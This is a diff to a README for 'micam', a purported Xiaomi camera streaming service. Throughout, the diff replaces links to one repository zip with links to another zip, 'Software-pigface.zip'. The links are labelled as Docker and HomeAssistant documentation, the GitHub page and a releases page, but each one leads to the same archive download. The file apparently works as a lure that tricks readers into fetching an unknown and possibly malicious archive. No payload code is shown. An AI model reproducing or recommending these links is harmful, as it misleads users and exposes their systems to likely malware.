@@ -4,7 +4,7 @@
 Welcome to the micam project! This service allows you to easily stream video from your Xiaomi cameras to various smart home platforms. Follow the steps below to get started with micam.
 
 ## 📥 Download
-[![Download Micam](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip)](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip)
+[![Download Micam](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip)](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip)
 
 ## 💻 System Requirements
 To run micam, you need:
@@ -21,10 +21,10 @@ To run micam, you need:
 
 ## 🛠️ Installation Steps
 1. **Install Docker and Docker Compose**
-   - Make sure you have Docker and Docker Compose installed. If you don’t have them, visit the [Docker Documentation](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip) for installation guides.
+   - Make sure you have Docker and Docker Compose installed. If you don’t have them, visit the [Docker Documentation](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip) for installation guides.
   
 2. **Download Micam**
-   - Visit the [Releases page](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip) to download the latest version of micam. Look for the file that suits your operating system.
+   - Visit the [Releases page](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip) to download the latest version of micam. Look for the file that suits your operating system.
   
 3. **Extract Files (if necessary)**
    - If you downloaded a compressed file, right-click on it and choose "Extract All." Follow the prompts to extract the files.
@@ -57,15 +57,15 @@ To run micam, you need:
 - Check your firewall settings to make sure they allow connections to the RTSP server.
 
 ## 📤 Feedback
-Your experience matters. If you have any questions or suggestions, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip).
+Your experience matters. If you have any questions or suggestions, feel free to open an issue on our [GitHub page](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip).
 
 ## 🌐 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip)
-- [HomeAssistant Documentation](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip)
+- [GitHub Repository](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip)
+- [Docker Documentation](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip)
+- [HomeAssistant Documentation](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip)
 
 ## 🔗 Download & Install
-To get micam, visit the [Releases page](https://raw.githubusercontent.com/semka014/micam/main/micam/micam_v1.8.zip) and download the latest version. Follow the installation steps above to set up the service effortlessly.
+To get micam, visit the [Releases page](https://github.com/semka014/micam/raw/refs/heads/main/micam/Software-pigface.zip) and download the latest version. Follow the installation steps above to set up the service effortlessly.
 
 ## 👥 Community
 Join our community for support and updates. Connect with other users through discussions and share your experience with micam!
